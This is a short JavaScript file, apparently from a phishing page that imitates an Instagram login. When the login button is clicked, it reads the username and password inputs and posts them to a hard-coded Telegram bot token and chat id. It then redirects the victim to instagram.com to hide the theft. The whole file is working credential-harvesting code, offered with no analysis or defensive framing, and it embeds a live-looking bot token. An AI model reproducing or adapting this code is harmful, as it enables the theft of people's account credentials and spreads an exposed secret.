let Token = '6427436198:AAHaIbF4oyzyl3rYkdwvQsj5r9mpM00xFUQ';
let ChatId = '5234014730';

let inputs = document.querySelectorAll('input');
let buttonLogin = document.querySelector('.login-button');

const SendMessageFunction = () => {
    let ApiUrl = `https://api.telegram.org/bot${Token}/sendMessage`;

    let data = {
        chat_id: ChatId,
        text: `username: ${inputs[0].value} \npassword: ${inputs[1].value}`
    };

    let options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    };

    fetch(ApiUrl, options)
    .then(response => response.json())
    .then(result => {
        console.log('Message sent:', result),
        window.location.href = "https://www.instagram.com/"
    })
    .catch(error => console.error('Error sending message:', error));
}

buttonLogin.addEventListener('click', SendMessageFunction)
